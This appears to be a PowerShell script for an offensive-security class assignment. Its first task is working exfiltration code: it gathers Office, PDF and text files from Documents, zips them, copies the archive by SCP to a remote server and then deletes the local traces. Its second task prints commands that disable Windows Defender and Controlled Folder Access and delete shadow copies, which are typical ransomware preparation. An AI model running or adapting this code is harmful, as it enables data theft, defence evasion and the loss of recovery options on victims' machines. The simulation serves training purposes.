# Task 1
# Search the filesystem, zip files, SCP to exfil server

# Create name of tempdir for zipping
$tempdir = "temp_zip"

# Create destination for copy
New-Item -ItemType Directory -Path $tempdir

# Get list of child items in Documents and loop through the results
foreach ($f in (Get-ChildItem -Recurse -Include *.docx, *.pdf, *.xlsx, *.txt -Path .\Documents)) {

    # Copy to a new folder location
    Copy-Item -Path $f.FullName -Destination $tempdir

}

# Create zip output name
$outfile = (Get-Date -Format "yyyy-MM-dd-HHmm") + "-exfil.zip"

# Zip the tempdir
Compress-Archive -Update -Path $tempdir -DestinationPath $outfile

# Copy zip file to remote host
Set-SCPItem -ComputerName "192.168.6.71" -Port 2222 -Credential (Get-Credential reed.simon) `
    -Path $outfile -Destination "/home/reed.simon/"

# Remove the tempdir and the zip after copying
Remove-Item -Recurse -Path $tempdir
Remove-Item $outfile

# Task 2
# Simluate disabling defender and controlled folder access
# Simulate removing restore points (do not actually remove)

Write-Host 'Disabling Windows Defender and Controlled Folder Access:'
Write-Host 'Set-MpPreference -DisableRealtimeMonitoring $true'
Write-Host 'Set-MpPreference -EnableControlledFolderAccess Disabled'

Write-Host ''
Write-Host 'Removing restore points and shadow copies:'
# Note: The assignment asks for a PowerShell cmdlet, however I was unable to find one.
# This command should work though
# Ref: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin-delete-shadows
Write-Host 'vssadmin delete shadows /for=<ForVolumeSpec> /quiet /all'
